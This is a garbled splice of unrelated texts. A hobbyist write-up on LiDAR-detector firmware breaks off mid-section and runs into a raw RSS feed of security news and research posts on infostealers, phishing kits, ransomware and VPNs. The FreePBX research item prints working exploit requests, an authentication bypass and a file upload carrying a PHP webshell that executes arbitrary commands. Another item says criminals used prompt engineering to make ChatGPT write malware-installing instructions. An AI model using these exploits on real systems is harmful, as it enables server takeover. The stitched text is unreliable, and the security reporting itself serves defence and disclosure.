  - A record of Exponential Moving Average Peaks per channel is kept and checked to determine whether some-but-not-all sensors fired at the same time or not.
- **TSOP IR-Decode Veto (Sometimes Brute Force** _is_ the Elegant Solution):
  - Consider signal source highly unlikely to be LiDAR when remote codes are successfully decoded by the TSOP within a measurement window
- **Periodic Blink (Detectable Duty Cycle):**
  - The iPhone Pro TrueDepth LiDAR seems to blink on and off in a way that is detectable, though this is less reliable as the signal is likely to move in and out of detection from simple movement by the person holding the source during a measurement window.

In order to accomplish all of this, the firmware leverages a few simple concepts to abstract and organize the measurements from the designed hardware, and analyze them in a useful manner.

- **Scoring System:**
  - In order to meaningfully analyze the measurements and programmatically decide whether a given signal is or is not the sought LiDAR device, the firmware utilizes a weighted scoring system. A score greater than a given amount must be achieved within a measurement window in order to trigger a detection.

    - Positive detection of sought measurements such as the desired dominant frequency, some-but-not-all sensors firing within a measurement window, and others are given a positive score of some amount

    - Positive IR remote code decode by the TSOP would grant a significant negative score.
- **Measurement Bucketing (Sampling):**
  - Measurement events are stored into fixed-time 4ms samples or “Buckets”
- **Ring Buffers (Fast Read, Fast Write):**
  - Measurement samples, or “Buckets”, are written and read using ring buffers. This is fast! It needs to be fast so it doesn’t end up wasting the hardware capability.
- **Interrupt Driven Signal Acquisition (Fast Edge Capture):**
  - The SAMD21 can do microsecond precision on Interrupt Timers. That’s fast
     _and this needs fast!_
- **Latching Hysteresis (No-Flappy Bird):**
  - In the earlier models, I noticed the detection would either snap on and then never turn off, or be near impossible to get to stay triggered and only observable via serial output rather than via the LED signal. This was not fun, it needs to be cute and light up. To fix this, I use counters to measure:

    - How many positive detections have been achieved in a given period of time

    - How many it has not triggered in the same period of time
  - Based on these counts, the “detection” indicator is fired and latched when detection has been achieved long enough, and unlatches when detection has not been achieved for long enough. This prevents some false positives and helps smooth the indication of a successful detection.

That sure is a lot, and I was not familiar with a lot of it before starting this project, so allow me to go into a bit more detail about some of these concepts.

## Frequency (FRE)

Before we talk about things FRE, we need to talk about _math_ (im sorry, I didn’t like this either). To get our **FRE** measurement in software we need to use the **Goertzel** algorithm. Before we can effectively do this though, **Detrending** and **Hann Smoothing** are performed on the measured signals first.

### **Detrending** / DC Offset Removal / whatever why are there so many names for things

What does this even mean? I had to look it up, which felt embarrassing because I do this for recording audio in a DAW but somehow did not make the connection here before looking it up, and learning about it from the audacity website of all places.

https://manual.audacityteam.org/man/dc\_offset.html

This is needed to remove the DC component from the signal to prevent the 0hz baseline from interfering with measurements of the 60hz signal in the noise. I really don’t understand this well, this required a lot of recursive web searches on how to measure and analyze signals. It seems like it works, but my understanding of it is pretty shallow.

To do this, **mean removal** is performed, which sounds positive! **Mean removal** ( **detrending**) is done in most simple way by computing the average of all samples in the window then subtracting that from every sample, like so:

```

Both Grok and ChatGPT were found to have been abused in these attacks.Forensic investigation of an AMOS alert showed the infection chain started when the user ran a Google search for “clear disk space on macOS.” Following that trail, the researchers found not one, but two poisoned AI conversations with instructions. Their testing showed that  similar searches produced the same type of results, indicating this was a deliberate attempt to infect Mac users.The search results led to AI conversations which provided clearly laid out instructions to run a command in the macOS Terminal. That command would end with the machine being infected with the AMOS malware.If that sounds familiar, you may have read our post about sponsored search results that led to fake macOS software on GitHub. In that campaign, sponsored ads and SEO-poisoned search results pointed users to GitHub pages impersonating legitimate macOS software, where attackers provided step-by-step instructions that ultimately installed the AMOS infostealer.As the researchers pointed out:“Once the victim executed the command, a multi-stage infection chain began. The base64-encoded string in the Terminal command decoded to a URL hosting a malicious bash script, the first stage of an AMOS deployment designed to harvest credentials, escalate privileges, and establish persistence without ever triggering a security warning.”This is dangerous for the user on many levels. Because there is no prompt or review, the user does not get a chance to see or assess what the downloaded script will do before it runs. It bypasses security because of the use of the command line, it can bypass normal file download protections and execute anything the attacker wants.Other researchers have found a campaign that combines elements of both attacks: the shared AI conversation and fake software install instructions. They found user guides for installing OpenAI’s new Atlas browser for macOS through shared ChatGPT conversations, which in reality led to AMOS infections.Most major chat interfaces (including Grok on X) also let users delete conversations or selectively share screenshots. That makes it easy for criminals to present only the polished, “helpful” part of a conversation and hide how they arrived there.The cybercriminals used prompt engineering to get ChatGPT to generate a step‑by‑step “installation/cleanup” guide that, in reality, installs malware. ChatGPT’s sharing feature creates a public link to a conversation that lives in the owner’s account. Attackers can curate their conversations to create a short, clean conversation which they can share.Then the criminals either pay for a sponsored search result pointing to the shared conversation or they use SEO techniques to get their posts high in the search results. Sponsored search results can be customized to look a lot like legitimate results. You’ll need to check who the advertiser is to find out it’s not real.From there, it’s a waiting game for the criminals. They rely on victims to find these AI conversations through search and then faithfully follow the step-by-step instructions.These attacks are clever and use legitimate platforms to reach their targets. But there are some precautions you can take.First and foremost, and I can’t say this often enough: Don’t click on sponsored search results. We have seen so many cases where sponsored results lead to malware, that we recommend skipping them or make sure you never see them. At best they cost the company you looked for money and at worst you fall prey to imposters.If you’re thinking about following a sponsored advertisement, check the advertiser first. Is it the company you’d expect to pay for that ad? Click the three‑dot menu next to the ad, then choose options like “About this ad” or “About this advertiser” to view the verified advertiser name and location.Never run copy-pasted commands from random pages or forums, even if they’re hosted on seemingly legitimate domains, and especially not commands that look like  or similar combinations.If you’ve scanned your Mac and found the AMOS information stealer:Remove any suspicious login items, LaunchAgents, or LaunchDaemons from the Library folders to ensure the malware does not persist after reboot.If any signs of persistent backdoor or unusual activity remain, strongly consider a full clean reinstall of macOS to ensure all malware components are eradicated. Only restore files from known clean backups. Do not reuse backups or Time Machine images that may be tainted by the infostealer.After reinstalling, check for additional rogue browser extensions, cryptowallet apps, and system modifications.If all this sounds too difficult for you to do yourself, ask someone or a company you trust to help you—our support team is happy to assist you if you have any concerns.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>New Advanced Phishing Kits Use AI and MFA Bypass Tactics to Steal Credentials at Scale</title><link>https://thehackernews.com/2025/12/new-advanced-phishing-kits-use-ai-and.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg4a8r1ltQRVAHGAuHpS5vuzkIAKVgEgZQt0hi_nLCDg6akixRXUC_2sswGCHs8tFV2oLmaZd-YAwL-Yu09qMZMC64PZ2EQNycGfpxLzqwqGXaf1mPfKRZtx4XWLOKPXc1uyH_zVni2tBfNkiOUQL0Cdy4qqTRGu99eo6jDQbNq6O1-lvaZ8ZmKI3r9EG0c/s1600/1000039728.jpg" length="" type=""/><pubDate>Fri, 12 Dec 2025 14:04:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have documented four new phishing kits named BlackForce, GhostFrame, InboxPrime AI, and Spiderman that are capable of facilitating credential theft at scale.

Extradited earlier this year, Dubranova faces trials in February and April 2026 tied to her suspected involvement in NoName057(16) and CyberArmyofRussia_Reborn (CARR), respectively.The indictment states that NoName057(16) operated as a state-sanctioned effort involving multiple threat actors and a government-created IT center. Their tooling includes a custom DDoS called ‘DDoSia’ used to launch attacks against government and financial agencies as well as critical transportation.Prosecutors say Russia’s military intelligence service funded and directed CARR, a hacktivist group with over 75,000 Telegram followers and a long record of attacks. Damage to U.S. water systems, an ammonia leak at a Los Angeles facility, and targeting of nuclear and election infrastructure are all attributed to CARR. Dubranova faces up to 27 years on CARR-related charges and 5 years on NoName charges. Multi-million dollar rewards are in place for information on either threat group.In Spain, authorities have . The suspect faces charges including cybercrime, unauthorized access, and privacy violations.The investigation first started in June after breaches at the unnamed firms were reported. Police later confirmed that the suspect possessed millions of stolen records containing full names, addresses, emails, phone numbers, DNI numbers, and IBAN codes. He reportedly tried to sell the data on multiple forums using six accounts and five pseudonyms.While officers have seized cryptocurrency wallets containing proceeds from the alleged sales, the total number of individuals affected remains unclear. Given the scale of the crime, Spanish authorities emphasize the seriousness of attempting to monetize stolen personal information.The Bad | Malicious VS Code Extensions Deploy Stealthy Infostealer MalwareTwo malicious Visual Studio Code extensions, . Each disguised as a harmless color theme and an AI coding assistant, the extensions were published under the alias ‘BigBlack’. While download counts are still low at the time of this writing, both packages point to a clear intent to compromise developer environments.Researchers note that earlier versions of Bitcoin Black used a PowerShell script to fetch a password-protected payload, briefly flashing a visible window that could alert users. The latest version now has a hidden batch script that quietly downloads a DLL and executable via curl, significantly reducing detection risk. Meanwhile, Codo AI delivers legitimate code-completion via ChatGPT or DeepSeek but embeds a malicious payload alongside these features.Both extensions deploy the Lightshot screenshot tool paired with a malicious DLL that uses DLL hijacking to load an infostealer called . Once executed, the malware creates a directory under  and . Finally, it launches Chrome and Edge in headless mode to extract cookies and hijack active sessions, targeting several crypto wallets including Phantom, MetaMask, and Exodus.Microsoft has since removed both extensions from the Marketplace and the malicious DLL is already flagged by 29 of 72 antivirus engines on VirusTotal. Developers are advised to install extensions only from trusted publishers and stay alert to atypical extension behavior.The Ugly | CyberVolk Resurfaces With New Telegram-Powered RaaS ‘VolkLocker’CyberVolk, a pro-Russia hacktivist persona first identified in late 2024, . SentinelLABS reported this week that the group has pivoted to using Telegram for both automation and customer interaction; however, operations are being undercut by payloads that retain artifacts, allowing victims to recover their files.VolkLocker is written in Golang and supports both Windows and Linux. Payloads are distributed largely unprotected, with RaaS operators instructed to use UPX for packing. Builders must supply key configuration values including a Bitcoin address, Telegram bot token ID, encryption deadline, file extension, and more. On execution, the ransomware attempts privilege escalation via the “ms-settings” UAC bypass, performs system and VM checks, and enumerates drives for encryption. A dynamic HTML ransom note then displays a 48-hour countdown, while a separate enforcement timer corrupts the system if deadlines or decryption attempts fail.Telegram serves as the backbone of the RaaS, offering operators an administrative panel, victim enumeration, broadcast messaging, and optional extensions such as RAT and keylogger control. Recent ads show CyberVolk expanding into standalone tooling with tiered pricing models.The encryption routine uses AES-256 in GCM mode with a hardcoded master key. Crucially, the key is written in plaintext to a file in , alongside the victim’s unique identifier and the attacker’s Bitcoin address – .Despite repeated account bans on Telegram, CyberVolk continues to evolve its services. The plaintext key flaw, however, reveals quality-control issues that limit the real-world impact of VolkLocker as-is.

These vulnerabilities are easily exploitable and enable authenticated/unauthenticated remote attackers to achieve remote code execution on vulnerable FreePBX instances. These issues are patched in FreePBX versions 16.0.42, 16.0.92, 17.0.6, 17.0.22. It is important to note that the authentication bypass is not vulnerable in the default configuration of FreePBX.The product at the center of the issue is FreePBX. FreePBX is an open source IP PBX management tool which is a modern phone system for businesses that use VoIP to make and receive phone calls. Given the nature of the product, FreePBX installations have a lot of moving parts and require relatively open access and availability. This makes it an ideal target for attackers.Back in October, when a security advisory came out for FreePBX indicating an authentication bypass leading to SQL injection and remote code execution, aka CVE-2025-57819, researchers at Horizon3.ai started investigating since the issue was being exploited in the wild. It also was added to the CISA KEV list due to exposure and impact. For a while, nobody knew the exploit and AI slop exploits were doing their rounds on GitHub, which led to a spray and pray of exploits that were not the actual exploit.What’s interesting, however, is that during our research, what we first thought was the authentication bypass and SQL injection leading to remote code execution actually turned out to be new vulnerabilities and were unrelated to CVE-2025-57819. We disclosed these new findings to FreePBX, which resulted in three separate advisories. A list of all recent vulnerabilities for FreePBX can be found here at FreePBX’s GitHub Security Reporting.As of today, the authentication bypass that does not rely on auth type webserver CVE-2025-57819 has gained the most attention and exploitation for good reason. It’s vulnerable in the default configuration of FreePBX and is an authentication bypass that leads to SQL injection and Remote Code Execution by inserting OS commands into the MySQL  table. Therefore, any SQL injections found can also result in remote code execution. Other payloads included adding users to the table or exfiltrating sensitive data.Is my FreePBX vulnerable?After discovering these vulnerabilities, we checked our customer base for exposure and did not find any customers vulnerable to these newly discovered issues. The main pre-requisite for unauthenticated exploitation is having FreePBX configured with either “webserver” authentication type or no authentication at all, but who would do that?😏Checking exposure on Shodan for FreePBX yields the following results:http.title:"freepbx" 11,907 results http.favicon.hash:"-1908328911" 10,977 resultshttp.favicon.hash:"1574423538" 398 resultshttp.title:"freepbx administration" 9,648Based on our assessment of customer environments the authentication bypass does not look widespread since default FreePBX instances come with as the authentication type. The SQL injections and file upload exist regardless of authentication type, but a valid  is still required.Detecting a FreePBX instance with an auth type webserver can be done by making a simple request without an Authorization header. Resulting in a verbose error message indicating we are missing the Authorization header.CVE-2025-61675 – Multiple SQL InjectionsDuring our research, we found four unique endpoints and 11 affected parameters vulnerable to SQL injection. Each issue allows for the same read and write access to the SQL database.SQL Injection BasestationA SQL injection vulnerability exists in the FreePBX Endpoint Management module affecting multiple parameters in the basestation configuration functionality. While authentication is required, the aforementioned authentication bypass is sufficient to exploit this issue.

While looking for the auth bypass described in CVE-2025-57819, we noticed the advanced settings contain a handful of authentication types. The auth types include database, none, user manager, and webserver. FreePBX explains what each other type means, and webserver stuck out as an interesting one to dive into further since it relies on security at the apache level. It is important to note that the authorization type webserver is not the default configuration of FreePBX.If you don’t see Authorization Type make sure you set the following to true to display themWith the pre-requisite configuration taken care of, we started looking for endpoints with the Endpoint Manager module since this is where the authentication bypass for CVE-2025-57819 was discovered. After browsing through the UI and using the provided features we grabbed an authenticated request and sent the same request but with the webserver type. The first error we got back indicated our authentication was incorrect.POST /admin/config.php?display=endpoint&view=customExt HTTP/1.1Host: 10.2.21.156User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0Content-Length: 4Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzipHTTP/1.0 500 Internal Server ErrorDate: Wed, 15 Oct 2025 19:01:57 GMTLast-Modified: Wed, 15 Oct 2025 19:01:57 GMTExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidateX-Frame-Options: SAMEORIGINSet-Cookie: PHPSESSID=2j99jt6vo9q3gpe75a2umm0ojd; expires=Fri, 14 Nov 2025 19:01:57 GMT; Max-Age=2592000; path=/Connection: closeContent-Type: text/html;charset=UTF-8Whoops\Exception\ErrorException: Undefined array key "PHP_AUTH_USER" in file /var/www/html/admin/libraries/gui_auth.php on line 38Stack trace:1.

We are able to leverage this for all the other SQL injections and upload a file that leads to remote code execution.CVE-2025-61678 –  Auth Type Webserver Authentication Bypass via Forged Authorization Header & Arbitrary File Upload VulnerabilityNow that we have a mechanism to bypass authentication under the webserver authorization type. We also noticed some other interesting endpoints. Such as the firmware upload endpoint. This provides the user a way to upload custom phone firmware. After issuing a few legitimate requests to see where the files are uploaded and what path, we noticed firmware is uploaded to the /tftpboot/customfw/ folder on the server. However, we were able to manipulate the file path as to where the file is stored as well as the contents not being validated which enabled us to upload any file types we desire. In this case, we figured a PHP webshell would be a great approach since FreePBX is written in PHP. Based on testing, it is required that a user has already uploaded a firmware file. If one wasn’t uploaded, the request fails.We can issue the following requests to upload a PHP webshellIssue a GET request to retrieve a valid PHPSESSID PHPSESSID=ubm0aqss91m258sf7p1um91to2;GET /admin/config.php HTTP/1.1Host: 10.2.21.156Referer: http://10.2.21.156/admin/config.phpAuthorization: Basic YWRtaW46YWRtaW4=HTTP/1.0 401 UnauthorizedDate: Wed, 15 Oct 2025 19:50:26 GMTLast-Modified: Wed, 15 Oct 2025 19:50:26 GMTExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidateX-Frame-Options: SAMEORIGINSet-Cookie: PHPSESSID=ubm0aqss91m258sf7p1um91to2; expires=Fri, 14 Nov 2025 19:50:26 GMT; Max-Age=2592000; path=/Set-Cookie: lang=en_USContent-Type: text/html; charset=utf-8Issue a POST request to upload the file with an arbitrary username and password such as  A valid username is not required.POST /admin/ajax.php?module=endpoint&command=upload_cust_fw HTTP/1.1Host: 10.2.21.156Referer: http://10.2.21.156/admin/config.php?display=endpoint&view=custfwupgradeAuthorization: Basic cmFuZG9tOnJhbmRvbQ==Cookie: PHPSESSID=ubm0aqss91m258sf7p1um91to2;Content-Type: multipart/form-data; boundary=----geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="dzuuid"48069f49-c03e-4182-81f7-48e36622e0d3------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="dzchunkindex"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="dztotalfilesize"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="dzchunksize"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="dztotalchunkcount"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="dzchunkbyteoffset"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="fwbrand"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="fwmodel"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="fwversion"------geckoformboundaryccb9f95c9e4119dba1ec857b71f857d7Content-Disposition: form-data; name="file"; filename="webshell.php"Content-Type: application/octet-stream<body><form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>"><input type="TEXT" name="cmd" autofocus id="cmd" size="80"><input type="SUBMIT" value="Execute"></form><?php      {          system($_GET['cmd'] .

Once this is set a security warning is displayed on the dashboard warning the user with the following message.Your system is using webserver authentication for the Authorization Type (Advanced Settings) option, which may offer reduced security compared to the default method.To revert to the default authentication, run:fwconsole setting AUTHTYPE usermanagerIf this configuration is intentional, you may continue using it.For more details, see GHSA-9jvh-mv6x-w698.It’s important to note that the underlying vulnerable code is still present and relies on authentication layers in front to provide security and access to the FreePBX instance. It still requires passing an Authorization header with a Basic base64 encoded username:password. Depending on the endpoint, we noticed a valid username was required.

We can’t. And today’s versions are failing us in predictable ways: pushing us to do things against our own best interests, gaslighting us with doubt about things we are or that we know, and being unable to distinguish between who we are and who we have been. They struggle with incomplete, inaccurate, and partial context: with no standard way to move toward accuracy, no mechanism to correct sources of error, and no accountability when wrong information leads to bad decisions.These aren’t edge cases. They’re the result of building AI systems without basic integrity controls. We’re in the third leg of data security—the old CIA triad. We’re good at availability and working on confidentiality, but we’ve never properly solved integrity. Now AI personalization has exposed the gap by accelerating the harms.The scope of the problem is large. A good AI assistant will need to be trained on everything we do and will need access to our most intimate personal interactions. This means an intimacy greater than your relationship with your email provider, your social media account, your cloud storage, or your phone. It requires an AI system that is both discreet and trustworthy when provided with that data. The system needs to be accurate and complete, but it also needs to be able to keep data private: to selectively disclose pieces of it when required, and to keep it secret otherwise. No current AI system is even close to meeting this.To further development along these lines, I and others have proposed separating users’ personal data stores from the AI systems that will use them. It makes sense; the engineering expertise that designs and develops AI systems is completely orthogonal to the security expertise that ensures the confidentiality and integrity of data. And by separating them, advances in security can proceed independently from advances in AI.What would this sort of personal data store look like? Confidentiality without integrity gives you access to wrong data. Availability without integrity gives you reliable access to corrupted data. Integrity enables the other two to be meaningful. Here are six requirements. They emerge from treating integrity as the organizing principle of security to make AI trustworthy.First, it would be broadly accessible as a data repository. We each want this data to include personal data about ourselves, as well as transaction data from our interactions. It would include data we create when interacting with others—emails, texts, social media posts—and revealed preference data as inferred by other systems. Some of it would be raw data, and some of it would be processed data: revealed preferences, conclusions inferred by other systems, maybe even raw weights in a personal LLM.Second, it would be broadly accessible as a source of data. This data would need to be made accessible to different LLM systems. This can’t be tied to a single AI model. Our AI future will include many different models—some of them chosen by us for particular tasks, and some thrust upon us by others. We would want the ability for any of those models to use our data.Third, it would need to be able to prove the accuracy of data. Imagine one of these systems being used to negotiate a bank loan, or participate in a first-round job interview with an AI recruiter. In these instances, the other party will want both relevant data and some sort of proof that the data are complete and accurate.Fourth, it would be under the user’s fine-grained control and audit. This is a deeply detailed personal dossier, and the user would need to have the final say in who could access it, what portions they could access, and under what circumstances. Users would need to be able to grant and revoke this access quickly and easily, and be able to go back in time and see who has accessed it.Fifth, it would be secure. The attacks against this system are numerous. There are the obvious read attacks, where an adversary attempts to learn a person’s data. And there are also write attacks, where adversaries add to or change a user’s data. Defending against both is critical; this all implies a complex and robust authentication system.Sixth, and finally, it must be easy to use. If we’re envisioning digital personal assistants for everybody, it can’t require specialized security training to use properly.I’m not the first to suggest something like this. Researchers have proposed a “Human Context Protocol” (https://papers.ssrn.com/sol3/ papers.cfm?abstract_id=5403981) that would serve as a neutral interface for personal data of this type. And in my capacity at a company called Inrupt, Inc., I have been working on an extension of Tim Berners-Lee’s Solid protocol for distributed data ownership.The engineering expertise to build AI systems is orthogonal to the security expertise needed to protect personal data. AI companies optimize for model performance, but data security requires cryptographic verification, access control, and auditable systems. Separating the two makes sense; you can’t ignore one or the other.Fortunately, decoupling personal data stores from AI systems means security can advance independently from performance (https:// ieeexplore.ieee.org/document/ 10352412). When you own and control your data store with high integrity, AI can’t easily manipulate you because you see what data it’s using and can correct it. It can’t easily gaslight you because you control the authoritative record of your context. And you determine which historical data are relevant or obsolete. Making this all work is a challenge, but it’s the only way we can have trustworthy AI assistants.This essay was originally published in .]]></content:encoded></item><item><title>New Windows RasMan zero-day flaw gets free, unofficial patches</title><link>https://www.bleepingcomputer.com/news/microsoft/new-windows-rasman-zero-day-flaw-gets-free-unofficial-patches/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 12 Dec 2025 11:28:06 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Free unofficial patches are available for a new Windows zero-day vulnerability that allows attackers to crash the Remote Access Connection Manager (RasMan) service.

Some VPNs genuinely protect your privacy, and some only sound like they do.With VPN usage rising around the world for streaming, travel, remote work, and basic digital safety, understanding what makes a VPN truly private matters more than ever.After years of trying VPNs for myself, privacy-minded family members, and a few mission-critical projects, here’s what I wish everyone knew.Why do you even need a VPN?If you’re wondering whether a VPN is worth it, you’re not alone. As your privacy-conscious consumer advocate, let me break down three time-saving and cost-saving benefits of using a privacy-first VPN.Keep your browsing privateEver feel like someone’s always looking over your shoulder online? Without a VPN, your internet service provider, and sometimes websites or governments, can keep tabs on what you do. A VPN encrypts your traffic and swaps out your real IP address for one of its own, letting you browse, shop, and read without a digital paper trail following you around.I’ve run into this myself while traveling. There were times when I needed a VPN just to access US or European web apps that were blocked in certain Asian countries. In other cases, I preferred to appear “based” in the US so that English-language apps would load naturally, instead of defaulting to the local language, currency, or content of the country I was visiting.Watch what you want, but pay lessSome of your favorite shows and websites are locked away simply because of where you live. In many cases, subscription or pay-per-view prices are higher in more prosperous regions. With a VPN, you can connect to servers in other countries and unlock content that isn’t available at home.For example, when All Elite Wrestling (AEW) announced its major 2022 pay-per-view featuring CM Punk vs. Jon Moxley, US fans paid $49.99 through Bleacher Report. Fans in the UK, meanwhile, watched the exact same event on FiteTV for $23 less, around half the price. Because platforms determine pricing based on your IP address, a VPN server in another region can show you the pricing available in that country. Savings like that can make a VPN pay for itself quickly.Stay safe on coffee-shop Wi-FiBefore you join a network named “Starbucks Guest WiFi,” remember that nothing stops a cybercriminal from broadcasting a hotspot with the same name. Public Wi-Fi is convenient, but it’s also one of the easiest places for someone to snoop on your traffic.Connecting to your VPN immediately encrypts everything you send or receive. That means you can check email, pay bills, or browse privately without worrying about someone nearby intercepting your information. Getting compromised will cost far more in money, time, and stress than most privacy-first VPN subscriptions.But what actually makes a VPN privacy-first?For a VPN, “privacy-first” can’t be just a nice slogan. It’s a mindset that shapes every technical, business, and legal decision.Collects as little data as possible — only the minimum needed to run the service.Enforces a real no-logs policy through design, not marketing.Builds privacy into everything, from software to server operations.Practices transparency, often through open-source components and independent audits.If a VPN can’t explain how it handles these areas, that’s a red flag.What is WireGuard and why is it such a big deal?WireGuard isn’t a VPN service. It’s the protocol that powers many modern VPNs, including Malwarebytes Privacy VPN. It’s the engine that handles encryption and securely routes your traffic.WireGuard is the superstar in the VPN world. Unlike clunkier, older protocols (like OpenVPN or IPSec) it’s deliberately lean and built for the modern internet. Its small codebase is easier to audit and leaves fewer places for bugs to hide. It’s fully open-source, so researchers can dig into exactly how it works.Its cryptography is fast, efficient, and modern with strong encryption, solid key exchange, and lightweight hashing that reduces overhead. In practice, that means better privacy and better performance without a provider having to gather connection data just to keep speeds usable.Of course, WireGuard is just the foundation. Each VPN implements it differently. The better ones add privacy-friendly tweaks like rotating IP addresses or avoiding static identifiers so that even they can’t link sessions back to individual users.With VPN usage rising, especially where new age-verification rules have sparked debate about whether VPNs might face future scrutiny, it’s more important than ever to choose providers with strong, transparent privacy practices.When you boil it down, a handful of questions reveal almost everything about how a VPN treats your privacy:Who controls the infrastructure?Are the servers RAM-only?Which protocol is used, and how is it implemented?What laws apply to the company?Have experts audited the service?Do transparency reports or warrant canaries exist and stay updated?Can you sign up and pay without giving away your entire identity?If a VPN provider gets evasive about any of this, or runs its service “for free” while collecting data to make the numbers work, that tells you almost everything you need to know.Why infrastructure ownership mattersOne of the most revealing questions you can ask is deceptively simple: Who actually owns the servers?Most VPNs rent hardware from large data centers or cloud platforms. When they do, your traffic travels through machines managed not only by the VPN’s engineers, but also by whoever runs those facilities. That introduces an access question: Who else has their hands on the hardware?When a VPN owns and operates its equipment, including racks and networking gear, it reduces the number of unknowns dramatically. The fewer third parties in the chain, the easier it is to stand behind privacy guarantees.RAM-only (diskless) servers: the gold standardRAM-only servers take this a step further. Because everything runs in memory, nothing is ever written to a hard drive. Pull the plug and the entire working state disappears instantly, like wiping a whiteboard clean. That means no logs sitting quietly on a disk, nothing for an intruder or authorities to seize, and nothing left behind if ownership, personnel, or legal circumstances change.This setup also tends to go hand-in-hand with owning the hardware. Most public cloud environments simply don’t allow true diskless deployments with full control over the underlying machine.Other privacy features to watch forEven with strong infrastructure and protocols, the details still matter. A solid kill switch keeps your traffic from leaking if the connection drops. Private DNS prevents queries from being routed through third parties. Multi-hop routes make correlation attacks harder. And torrent users may want carefully implemented port forwarding that doesn’t introduce side channels.These aren’t flashy features, but they show whether a provider has considered the full privacy landscape, not just the obvious parts.Audits and transparency reportsA provider that truly stands behind its privacy claims will welcome outside inspection. Independent audits, published findings, and ongoing transparency reports help confirm whether logging is disabled in practice, not just in principle. Some companies also maintain warrant canaries (more on this below). None of these are perfect, but together they paint a clear picture of how seriously the VPN treats user trust.A warrant canary in the VPN coalmineOkay, so here’s something interesting: some companies use something called a “warrant canary” to quietly let us know if they’ve received a top-secret government request for data. Here’s the deal…it’s illegal for them to simply tell us, “Hey, the government’s snooping around.” So, instead, they publish a simple statement that says something like, “As of January 2026, we haven’t received any secret orders for your data.”The clever part is that they update this statement on a regular basis. If it suddenly disappears or just stops getting updated, it could mean the company got hit with one of these hush-hush requests and legally can’t talk about it. It’s like the digital version of a warning signal. It is nothing flashy, but if you’re paying attention, you’ll spot when something changes.It’s not a perfect system (and who knows what the courts will think of it in the future), but a warrant canary is one-way companies try to be on our side, finding ways to keep us in the loop even when they’re told to stay silent. So, give an extra ounce of trust to companies that publish these regularly.Where privacy-first VPNs are headingExpect to see continued evolution: new cryptography built for a post-quantum world, more transparency from providers, decentralized and community-run VPN options, and tighter integration with secure messaging, encrypted DNS, and whatever comes next. It’s also worth keeping an eye on how governments respond to rising VPN use. In the UK, for example, new age-verification rules triggered a huge spike in VPN sign-ups and a public debate about whether VPN usage should be monitored more closely. There’s no proposal to restrict or ban VPNs, but the conversation is active.If you care about your privacy online, don’t settle for slick marketing. Look for the real foundations like modern protocols, owned and well-managed infrastructure, RAM-only servers, regular audits, and a culture that treats transparency as a habit, not a stunt.Privacy is engineered, not simply promised. With the right VPN, you stay in control of your digital life instead of hoping someone else remembers to keep your secrets safe.We don’t just report on privacy—we offer you the option to use it.]]></content:encoded></item><item><title>Securing GenAI in the Browser: Policy, Isolation, and Data Controls That Actually Work</title><link>https://thehackernews.com/2025/12/securing-genai-in-browser-policy.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDv3XARtOUivvjEnErljioTinVDnawx7b3HwjUiP4I_0_JvCPo8jro-fI8ZJHESGp8sG0SMYH4BgfZqMQMeGA95kuzhe3z3m6GgMCtBdqRtLJ1WRKUHTJv8XoRLh8H7UXi3wMH0O9BhfsBsLyRFdsv53qh-TYgOwFr3PzpdsKcZ4QryozVIoGGJhVKP_c/s1600/ai.jpg" length="" type=""/><pubDate>Fri, 12 Dec 2025 10:18:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[The browser has become the main interface to GenAI for most enterprises: from web-based LLMs and copilots, to GenAI‑powered extensions and agentic browsers like ChatGPT Atlas.

However, the attack is far from over at that point. The moment the confidential information falls into the hands of cybercriminals, it immediately transforms into a commodity and enters the shadow market conveyor belt.In this article, we trace the path of the stolen data, starting from its collection through various tools – such as Telegram bots and advanced administration panels – to the sale of that data and its subsequent reuse in new attacks. We examine how a once leaked username and password become part of a massive digital dossier and why cybercriminals can leverage even old leaks for targeted attacks, sometimes years after the initial data breach.Data harvesting mechanisms in phishing attacksBefore we trace the subsequent fate of the stolen data, we need to understand exactly how it leaves the phishing page and reaches the cybercriminals.By analyzing real-world phishing pages, we have identified the most common methods for data transmission:Send to an email address.Upload to an administration panel.It also bears mentioning that attackers may use legitimate services for data harvesting to make their server harder to detect. Examples include online form services like Google Forms, Microsoft Forms, etc. Stolen data repositories can also be set up on GitHub, Discord servers, and other websites. For the purposes of this analysis, however, we will focus on the primary methods of data harvesting.Data entered into an HTML form on a phishing page is sent to the cybercriminal’s server via a PHP script, which then forwards it to an email address controlled by the attacker. However, this method is becoming less common due to several limitations of email services, such as delivery delays, the risk of the hosting provider blocking the sending server, and the inconvenience of processing large volumes of data.As an example, let’s look at a phishing kit targeting DHL users.The  file contains the phishing form designed to harvest user data – in this case, an email address and a password.Phishing form imitating the DHL websiteThe data that the victim enters into this form is then sent via a script in the  file to the email address specified within the  file.Contents of the PHP scriptsUnlike the previous method, the 